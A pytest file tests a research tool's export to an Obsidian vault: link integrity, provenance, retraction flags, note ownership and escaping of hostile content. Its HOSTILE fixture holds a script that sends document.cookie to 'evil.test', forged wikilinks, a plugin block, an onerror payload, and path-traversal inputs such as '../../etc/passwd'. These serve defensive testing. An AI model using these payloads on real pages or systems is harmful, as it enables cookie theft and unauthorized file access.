"""Exporting an investigation into an Obsidian vault.

Two things are being checked: that the research graph survives the
translation into notes and links, and that a vault is a hostile rendering
target - Obsidian renders HTML, resolves wikilinks, and runs plugin code in
fenced blocks, so retrieved content has to arrive defanged.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest
import yaml

from research.acquisition.pipeline import EvidenceAcquirer
from research.export.markdown import escape_external, frontmatter, safe_filename, wikilink
from research.export.obsidian import MARKER, ObsidianExporter
from research.models.claim import EvidenceStance
from research.models.common import Provenance, SourceFamily, SourceType
from research.models.event import DatePrecision
from research.models.investigation import InvestigationStatus, StopReason
from research.normalize.document import build_document
from research.operations.claims import ClaimOperations
from research.operations.timeline import TimelineOperations

WIRE = (
    "WASHINGTON (Reuters) - The utility group said on Wednesday it had agreed to terminate "
    "the flagship small modular reactor project after subscription levels fell short of "
    "what was needed to proceed with construction."
)

HOSTILE = (
    "The filing says costs rose.\n"
    "<script>fetch('http://evil.test/'+document.cookie)</script>\n"
    "See [[Private Note]] and ![[secrets.md]] for more.\n"
    "```dataview\nLIST FROM \"\"\n```\n"
    "%%hidden%%\n"
    "# Fake heading\n"
)


@pytest.fixture
def investigated(store):
    investigation = store.investigations.create(
        "Are small modular reactors competitive for AI data centres?"
    )
    acquirer = EvidenceAcquirer(store)

    def add(title, text, url, source_type, family, **kwargs):
        return acquirer.persist(
            build_document(
                provider="test",
                source_type=source_type,
                source_family=family,
                provenance=Provenance(provider="test"),
                title=title,
                text=text,
                url=url,
                **kwargs,
            ),
            investigation_id=investigation.id,
        ).document

    original = add(
        "Utility group terminates flagship reactor project", WIRE,
        "https://www.reuters.test/business/a",
        SourceType.ORIGINAL_NEWS_REPORTING, SourceFamily.NEWS,
    )
    copy = add(
        "Utility group terminates flagship reactor project", WIRE,
        "https://www.gazette.test/wire/a",
        SourceType.SECONDARY_NEWS_REPORTING, SourceFamily.NEWS,
    )
    filing = add(
        "Annual report: risk factors",
        "Our estimated cost of electricity is subject to material uncertainty. " + HOSTILE,
        "https://www.sec.gov/Archives/edgar/data/1/0001.htm",
        SourceType.CORPORATE_FILING, SourceFamily.CORPORATE,
    )
    retracted = add(
        "Rapid cost declines in factory-built components",
        "We report cost declines of 40 percent per doubling.",
        "https://doi.org/10.1234/retracted.2022.9",
        SourceType.ACADEMIC_PEER_REVIEWED, SourceFamily.ACADEMIC,
        metadata={"is_retracted": True},
    )

    operations = ClaimOperations(store, investigation_id=investigation.id)
    claim = operations.create_claim("The flagship project was terminated")
    operations.link_evidence(
        claim.id, original.id, EvidenceStance.SUPPORTS,
        excerpt="agreed to terminate the flagship small modular reactor project",
        analysis="the wire report is the origin of this story",
    )
    operations.link_evidence(claim.id, copy.id, EvidenceStance.SUPPORTS)
    contested = operations.create_claim("Factory production has halved component costs")
    operations.link_evidence(contested.id, retracted.id, EvidenceStance.SUPPORTS)

    TimelineOperations(store, investigation_id=investigation.id).record_event(
        "Project terminated",
        evidence_ids=[original.id],
        date_start=original.published_at or None,
        date_precision=DatePrecision.DAY if original.published_at else DatePrecision.UNKNOWN,
    )
    store.investigations.set_status(
        investigation.id,
        InvestigationStatus.COMPLETED,
        stop_reason=StopReason.NO_OPEN_TASKS,
        stop_detail="nothing left to run",
    )
    return store, investigation, {
        "original": original, "copy": copy, "filing": filing,
        "retracted": retracted, "claim": claim, "contested": contested,
    }


@pytest.fixture
def vault(tmp_path) -> Path:
    path = tmp_path / "Vault"
    path.mkdir()
    (path / ".obsidian").mkdir()  # what makes a folder a vault
    return path


@pytest.fixture
def exported(investigated, vault):
    store, investigation, fixtures = investigated
    result = ObsidianExporter(store, investigation.id).export(vault)
    return result, fixtures, vault


def read(path: Path) -> str:
    return path.read_text(encoding="utf-8")


def note_for(folder: Path, identifier: str) -> Path:
    prefix = identifier.replace(":", "-")
    matches = [path for path in folder.rglob("*.md") if path.name.startswith(prefix + " ")]
    assert matches, f"no note for {identifier}"
    return matches[0]


def parse_frontmatter(text: str) -> dict:
    """Read a frontmatter block the way a parser does.

    The block ends at a line that is exactly '---', not at the first '---'
    found anywhere: a value containing that string, indented inside a quoted
    scalar, does not end it. Splitting naively is the bug this guards.
    """
    assert text.startswith("---\n")
    lines = text.split("\n")[1:]
    end = next(index for index, line in enumerate(lines) if line == "---")
    return yaml.safe_load("\n".join(lines[:end])) or {}


def properties(path: Path) -> dict:
    return parse_frontmatter(read(path))


class TestMarkdownSafety:
    def test_html_cannot_survive_into_a_note(self) -> None:
        escaped = escape_external("<script>alert(1)</script>")
        assert "<script>" not in escaped
        assert "&lt;script&gt;" in escaped

    def test_retrieved_text_cannot_forge_links(self) -> None:
        escaped = escape_external("See [[Private Note]] and ![[secrets.md]]")
        assert "[[Private Note]]" not in escaped
        assert "![[" not in escaped

    def test_retrieved_text_cannot_open_a_plugin_block(self) -> None:
        escaped = escape_external('```dataview\nLIST FROM ""\n```')
        assert "```" not in escaped

    def test_retrieved_text_cannot_comment_out_the_note(self) -> None:
        assert "%%" not in escape_external("%%everything after this%%")

    def test_retrieved_text_cannot_forge_headings(self) -> None:
        assert escape_external("# Heading\n## Another").startswith("\\#")

    def test_frontmatter_survives_an_injection_attempt(self) -> None:
        block = frontmatter({"title": "Costs rise\n---\nmalicious: true", "id": "evidence:1"})
        parsed = parse_frontmatter(block)
        # The injected text is a value, not a property, and it did not end the
        # block early and spill into the note body.
        assert parsed["title"] == "Costs rise\n---\nmalicious: true"
        assert "malicious" not in parsed
        assert set(parsed) == {"title", "id"}

    @pytest.mark.parametrize(
        "raw", ["../../etc/passwd", "a/b\\c", 'quotes"and:colons', "\x00control", "   ", ""]
    )
    def test_filenames_are_safe(self, raw: str) -> None:
        name = safe_filename(raw)
        assert "/" not in name and "\\" not in name and ":" not in name
        assert name and name == name.strip()
        assert "\x00" not in name

    def test_entities_cannot_be_reassembled_into_a_tag(self) -> None:
        """Escaping ampersands first is what makes the rest hold.

        Without it, content containing '&lt;script&gt;' would pass through
        untouched and a renderer would decode it back into a tag.
        """
        assert escape_external("&lt;script&gt;alert(1)&lt;/script&gt;") == (
            "&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;"
        )
        assert "<" not in escape_external(escape_external("<img onerror=alert(1)>"))

    def test_aliases_cannot_break_a_link(self) -> None:
        assert wikilink("note|with|pipes", "alias|too") == "[[note with pipes|alias too]]"


class TestVaultStructure:
    def test_a_note_is_written_for_every_record(self, exported) -> None:
        result, fixtures, _ = exported
        names = {path.name for path in result.written}
        assert any(name.startswith("investigation-1 ") for name in names)
        assert sum(1 for name in names if name.startswith("evidence-")) == 4
        assert sum(1 for name in names if name.startswith("claim-")) == 2
        assert any(name.startswith("event-") for name in names)
        assert result.canvas is not None

    def test_notes_are_grouped_by_kind(self, exported) -> None:
        result, _, _ = exported
        folders = {path.parent.name for path in result.written if path.suffix == ".md"}
        assert {"Claims", "Evidence", "Events"} <= folders

    def test_everything_lands_inside_the_export_folder(self, exported, vault) -> None:
        result, _, _ = exported
        for path in result.written:
            assert result.folder in path.parents or path == result.folder
            assert vault in path.parents

    def test_identifiers_are_aliases_so_reports_link_up(self, exported) -> None:
        result, fixtures, _ = exported
        note = note_for(result.folder, fixtures["original"].id)
        assert properties(note)["aliases"] == [fixtures["original"].id]

    def test_frontmatter_carries_the_structured_record(self, exported) -> None:
        result, fixtures, _ = exported
        data = properties(note_for(result.folder, fixtures["filing"].id))
        assert data["type"] == "evidence"
        assert data["source_type"] == "corporate_filing"
        assert data["content_hash"].startswith("sha256:")
        assert data["generated_by"] == MARKER
        assert "research/evidence" in data["tags"]


class TestGraphSurvivesTheTranslation:
    def test_claims_link_to_their_evidence(self, exported) -> None:
        result, fixtures, _ = exported
        body = read(note_for(result.folder, fixtures["claim"].id))
        evidence_note = note_for(result.folder, fixtures["original"].id).stem
        assert f"[[{evidence_note}" in body

    def test_excerpts_are_quoted_and_analysis_is_labelled(self, exported) -> None:
        result, fixtures, _ = exported
        body = read(note_for(result.folder, fixtures["claim"].id))
        assert "> agreed to terminate the flagship" in body
        assert "analysis (model reasoning, not evidence)" in body

    def test_a_copy_does_not_masquerade_as_a_source(self, exported) -> None:
        result, fixtures, _ = exported
        note = note_for(result.folder, fixtures["copy"].id)
        data = properties(note)
        assert data["independence"] == "syndicated_copy"
        assert "evidence/not-independent" in data["tags"]
        body = read(note)
        assert "Not independent" in body
        assert fixtures["original"].id in body

    def test_the_original_lists_the_copies_it_stood_in_for(self, exported) -> None:
        result, fixtures, _ = exported
        body = read(note_for(result.folder, fixtures["original"].id))
        assert "Also retrieved as 1 copy" in body

    def test_a_retraction_is_prominent(self, exported) -> None:
        result, fixtures, _ = exported
        note = note_for(result.folder, fixtures["retracted"].id)
        assert "[!danger] Retracted" in read(note)
        assert "evidence/retracted" in properties(note)["tags"]

    def test_provenance_is_recorded_on_every_evidence_note(self, exported) -> None:
        result, fixtures, _ = exported
        body = read(note_for(result.folder, fixtures["original"].id))
        assert "## Provenance" in body
        assert "content hash" in body
        assert "sha256:" in body

    def test_the_index_note_is_the_report_with_working_links(self, exported) -> None:
        result, fixtures, _ = exported
        index = next(path for path in result.written if path.name.startswith("investigation-1 "))
        body = read(index)
        assert "## Key findings" in body
        assert "## Sources" in body
        claim_note = note_for(result.folder, fixtures["claim"].id).stem
        assert f"[[{claim_note}|{fixtures['claim'].id}]]" in body

    def test_every_link_points_at_a_note_that_exists(self, exported) -> None:
        import re

        result, _, _ = exported
        names = {path.stem for path in result.written if path.suffix == ".md"}
        for path in result.written:
            if path.suffix != ".md":
                continue
            for target in re.findall(r"(?<!\\)\[\[([^\]|]+)", read(path)):
                assert target in names, f"{path.name} links to a missing note: {target}"


class TestHostileContent:
    def test_retrieved_markup_is_defanged_in_the_note(self, exported) -> None:
        result, fixtures, _ = exported
        body = read(note_for(result.folder, fixtures["filing"].id))
        assert "<script>" not in body
        assert "&lt;script&gt;" in body
        assert "[[Private Note]]" not in body
        assert "```dataview" not in body
        assert "%%hidden%%" not in body

    def test_retrieved_text_is_marked_as_external(self, exported) -> None:
        result, fixtures, _ = exported
        body = read(note_for(result.folder, fixtures["filing"].id))
        assert "[!quote]" in body
        assert "external, untrusted" in body

    def test_the_note_still_parses_as_frontmatter_plus_body(self, exported) -> None:
        result, fixtures, _ = exported
        data = properties(note_for(result.folder, fixtures["filing"].id))
        assert data["id"] == fixtures["filing"].id


class TestVaultOwnership:
    def test_re_exporting_updates_its_own_notes(self, investigated, vault) -> None:
        store, investigation, _ = investigated
        exporter = ObsidianExporter(store, investigation.id)
        first = exporter.export(vault)
        second = exporter.export(vault)
        assert len(second.written) == len(first.written)
        assert second.skipped == []

    def test_a_note_we_did_not_write_is_left_alone(self, investigated, vault) -> None:
        store, investigation, fixtures = investigated
        exporter = ObsidianExporter(store, investigation.id)
        result = exporter.export(vault)
        mine = note_for(result.folder, fixtures["claim"].id)
        mine.write_text("# My own notes on this claim\n", encoding="utf-8")

        again = exporter.export(vault)
        assert read(mine) == "# My own notes on this claim\n"
        assert any(path == mine for path, _ in again.skipped)
        assert any("not generated by this export" in reason for _, reason in again.skipped)

    def test_force_overwrites_when_asked(self, investigated, vault) -> None:
        store, investigation, fixtures = investigated
        exporter = ObsidianExporter(store, investigation.id)
        result = exporter.export(vault)
        mine = note_for(result.folder, fixtures["claim"].id)
        mine.write_text("# My own notes\n", encoding="utf-8")

        again = exporter.export(vault, force=True)
        assert again.skipped == []
        assert "My own notes" not in read(mine)

    def test_writing_outside_the_vault_is_refused(self, investigated, tmp_path) -> None:
        store, investigation, _ = investigated
        exporter = ObsidianExporter(store, investigation.id)
        with pytest.raises(ValueError, match="outside the vault"):
            exporter.export(tmp_path / "vault", folder="../../escape")


class TestCanvas:
    def test_the_canvas_is_valid_and_marked(self, exported) -> None:
        result, _, _ = exported
        canvas = json.loads(read(result.canvas))
        assert canvas["generated_by"] == MARKER
        assert canvas["nodes"] and canvas["edges"]

    def test_canvas_nodes_point_at_notes_that_exist(self, exported, vault) -> None:
        result, _, _ = exported
        canvas = json.loads(read(result.canvas))
        for node in canvas["nodes"]:
            assert (vault / node["file"]).exists(), node["file"]

    def test_copies_are_not_drawn_as_separate_sources(self, exported) -> None:
        result, fixtures, _ = exported
        canvas = json.loads(read(result.canvas))
        node_ids = {node["id"] for node in canvas["nodes"]}
        assert fixtures["copy"].id.replace(":", "-") not in node_ids
        assert fixtures["original"].id.replace(":", "-") in node_ids

    def test_edges_carry_the_stance(self, exported) -> None:
        result, _, _ = exported
        canvas = json.loads(read(result.canvas))
        labels = {edge["label"] for edge in canvas["edges"]}
        assert "supports" in labels
        assert all(edge["fromNode"] and edge["toNode"] for edge in canvas["edges"])
